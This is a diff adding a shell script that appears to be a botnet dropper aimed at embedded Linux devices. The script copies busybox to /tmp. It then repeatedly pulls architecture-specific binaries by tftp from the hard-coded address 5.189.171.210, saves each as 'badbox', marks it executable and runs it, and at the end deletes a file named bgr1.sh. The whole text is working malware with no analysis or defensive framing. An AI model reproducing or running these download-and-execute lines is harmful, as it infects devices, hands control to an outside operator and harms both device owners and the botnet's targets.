@@ -1,0 +1,23 @@
+#!/bin/arcsh
+ulimit -n 1024
+cp /bin/busybox /tmp/
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get arcms;cat arcms >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get arcml;cat arcml >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get arc4t;cat arc4t >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get arc4l;cat arc4l >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get arc5l;cat arc5l >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get arc6l;cat arc6l >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get arc7l;cat arc7l >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get arcsh;cat arcsh >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get arcpc;cat arcpc >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get arc440;cat arc440 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get arcm68;cat arcm68 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get arcsprc;cat arcsprc >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get arc32;cat arc32 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get arc38;cat arc38 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get arc48;cat arc48 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get arc58;cat arc58 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get arc64;cat arc64 >badbox;chmod +x *;./badbox
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 5.189.171.210 -c get arc68;cat arc68 >badbox;chmod +x *;./badbox
+
+rm -rf bgr1.sh
